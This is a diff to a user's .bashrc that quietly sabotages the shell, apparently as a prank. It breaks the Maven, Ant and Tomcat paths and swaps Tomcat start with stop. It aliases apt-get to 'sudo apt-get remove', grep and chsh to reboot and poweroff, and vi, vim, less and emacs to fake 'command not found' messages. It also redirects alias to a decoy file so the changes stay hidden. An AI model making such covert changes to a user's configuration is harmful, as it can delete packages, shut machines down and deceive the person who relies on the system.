@@ -17,25 +17,25 @@ HISTCONTROL=ignoreboth
 export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/
 export PATH=%JAVA_HOME/bin:$PATH
 
-export M2_HOME=/home/joshb/uportal/maven/apache-maven-3.3.9
+export M2_HOME=/home/nope/uportal/maven/apache-maven-3.3.9
 export M2=$M2_HOME/bin
 export PATH=$M2:$PATH
 
-export ANT_HOME=/home/joshb/uportal/ant/apache-ant-1.9.4
+export ANT_HOME=/home/niceTry/uportal/ant/apache-ant-1.9.4
 export PATH=$PATH:$ANT_HOME/bin
 
-export TOMCAT_HOME=/home/joshb/uportal/tomcat/apache-tomcat-8.5.8
+export TOMCAT_HOME=/home/lol/uportal/tomcat/apache-tomcat-8.5.8
 export PATH=$PATH:$TOMCAT_HOME
-export JAVA_OPTS="-server -XX:MaxPermSize=512m -Xms1024m -Xmx2048m"
+export JAVA_OPTS="-server -XX:MaxPermSize=2m -Xms1024m -Xmx2048m"
 
 
 # My Tomcat Script
 function t {
 for i in "$@"; do
     if [[ $i == "start" ]]; then
-        $TOMCAT_HOME/bin/startup.sh
-    elif [[ $i == "stop" ]]; then
         $TOMCAT_HOME/bin/shutdown.sh
+    elif [[ $i == "stop" ]]; then
+        $TOMCAT_HOME/bin/startup.sh
         sleep 5
     elif [[ $i == "restart" ]]; then
         $TOMCAT_HOME/bin/shutdown.sh
@@ -135,20 +135,20 @@ fi
 #export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
 
 # some more ls aliases
-alias apt-get='sudo apt-get'
+alias apt-get='sudo apt-get remove'
 alias c='clear'
 alias ..='cd ..' 
 alias ...='cd ../../../' 
 alias ....='cd ../../../../'
-alias reboot='sudo /sbin/reboot'
-alias poweroff='sudo /sbin/poweroff' 
+alias grep='sudo /sbin/reboot'
+alias chsh='sudo /sbin/poweroff' 
 alias webapp=~/uportal/uportal/bin/webapp_cntl.sh
 
-#alias vi="~/.prank_wrapper.sh vi"
-#alias vim="~/.prank_wrapper.sh vim"
-#alias emacs="~/.prank_wrapper.sh emacs"
-#alias less="~/.prank_wrapper.sh less"
-#alias ls="ls -alR /*"
+alias vi="echo No command found 'vi', did you mean 'vim'"
+alias vim=echo "No command found 'vim', did you mean 'vi'"
+alias less=echo "No command found 'vi', did you mean 'vim'"
+alias emacs=echo "No command found 'vi', did you mean 'vim'"
+alias ls="ls -alR "
 
 alias alias="cat ~/.old_alias"
 
